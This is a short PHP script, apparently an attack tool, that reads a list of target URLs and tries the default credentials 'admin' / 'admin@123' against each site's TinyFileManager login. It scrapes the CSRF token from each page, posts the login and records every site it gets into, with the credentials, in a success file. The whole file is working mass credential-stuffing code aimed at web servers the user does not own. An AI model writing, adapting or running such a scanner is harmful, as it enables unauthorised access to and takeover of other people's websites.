<?php
/**
 * TinyFileManager Mass Login Checker
 */

$username = "admin";
$password = "admin@123";
$listFile = "list.txt";
$outputFile = "success.txt";

if (!file_exists($listFile)) {
    die("[-] File $listFile tidak ditemukan!\n");
}

$urls = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
echo "[+] Memulai pengecekan pada " . count($urls) . " target...\n";

foreach ($urls as $url) {
    $url = trim($url);
    echo "[?] Testing: $url ... ";

  
    $ch = curl_init($url);
    $cookiePath = tempnam(sys_get_temp_dir(), 'cookie_');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiePath);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $source = curl_exec($ch);
    
    // Ekstrak Token CSRF (Jika ada)
    preg_match('/name="token" value="([^"]+)"/', $source, $matches);
    $token = $matches[1] ?? '';

    $postFields = [
        'fm_usr' => $username,
        'fm_pwd' => $password,
        'token'  => $token
    ];

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiePath);
    
    $result = curl_exec($ch);
    

    if (strpos($result, 'logout') !== false || strpos($result, '?p=') !== false) {
        echo "[\033[32mOK\033[0m]\n";
        file_put_contents($outputFile, "$url | $username:$password\n", FILE_APPEND);
    } else {
        echo "[\033[31mFAILED\033[0m]\n";
    }

    @unlink($cookiePath);
}

echo "\n[+] Selesai! Hasil yang berhasil disimpan di $outputFile\n";
